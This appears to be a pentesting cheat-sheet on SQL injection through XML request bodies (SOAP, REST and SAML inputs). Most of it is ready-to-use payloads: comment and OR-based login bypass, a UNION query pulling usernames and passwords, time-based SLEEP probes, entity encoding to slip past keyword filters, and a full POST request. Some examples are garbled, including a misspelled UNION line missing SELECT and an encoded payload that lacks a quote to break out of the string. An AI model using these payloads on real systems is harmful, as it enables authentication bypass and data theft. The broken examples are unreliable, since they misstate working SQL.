# 🧨 SQL Injection via XML Payloads

## 📌 What is SQLi via XML?

Some modern applications (especially SOAP APIs, enterprise systems, and mobile backends) use **XML** to transfer data between the client and server.

If this XML input is **parsed unsafely and passed directly into SQL queries**, then an attacker can **inject SQL code** through the XML data.

---

## 🧭 Where You Might See XML

- SOAP-based web services
- REST APIs with `Content-Type: application/xml`
- Legacy mobile app backends
- Backend systems with file-based XML inputs (e.g., `.xml` uploads)
- Authentication using SAML (uses XML under the hood)
- Anywhere where XML data is parsed and used in a SQL query

--- 

## 🕵️ How to Detect SQLi via XML

### ✅ 1. Identify XML Usage

Check requests that:

- Have `Content-Type: application/xml`
- Accept raw XML body
- Return XML in response
- Have `.xml` file uploads

---

## 🧪 Common XML SQLi Payloads

### 🔹 Basic String Injection

`<login>`
	`<username> admin'-- </username>`      ` # always use <space> after comment `
	`<password> anything </password>` 
`</login>`

➡️ Can bypass password check if SQL is like:

`SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'`
or
` category=Gifts' UNION 'usernamr'||'password' FROM users`

---

### 🔹 OR-based Login Bypass

`<login>`   
	`<username> ' OR '1'='1 </username>`   
	`<password> random </password>`
`</login>`

➡️ Bypasses login forms using Boolean condition.

---

### 🔹 UNION Injection

`<product>  
	`<category> ' UNION SELECT username, password FROM users-- </category>
`</product>` 

➡️ Appends output from another table to original results.

---

### 🔹 Time-based Blind SQLi

`<order>   <id>1' OR SLEEP(5)--</id> </order>`

➡️ If the response delays by 5+ seconds, it's injectable.

---

### 🔹 Filter Bypass Using XML Encoding

Some applications **sanitize** suspicious strings like `SELECT`, `'`, `--`, etc.

You can **bypass** this using XML encoding:

| Character          | Encoded             |
| ------------------ | ------------------- |
| `'` (single quote) | `&#x27;` or `&#39;` |
| `"` (double quote) | `&#x22;`            |
| `S`                | `&#x53;`            |
| `E`                | `&#x45;`            |
| `L`                | `&#x4C;`            |
| `;`                | `&#x3B;`            |

### 🧪 Example Payload Using Encoding:

`<stockCheck>  
	`<productId> 1 </productId>   
	`<storeId> 999 &#x53;ELECT * FROM users </storeId> 
`</stockCheck>`

➡️ Server decodes `&#x53;ELECT` to `SELECT`, query becomes malicious.

---

### 🔹 POST Request Example (Full)

`POST /api/check HTTP/1.1 `
`Host: vulnerable-site.com Content-Type: application/xml ` 

`<stockCheck>`  
	`<productId> 1 </productId>`   
	`<storeId> 999' OR 1=1-- </storeId>` 
`</stockCheck>`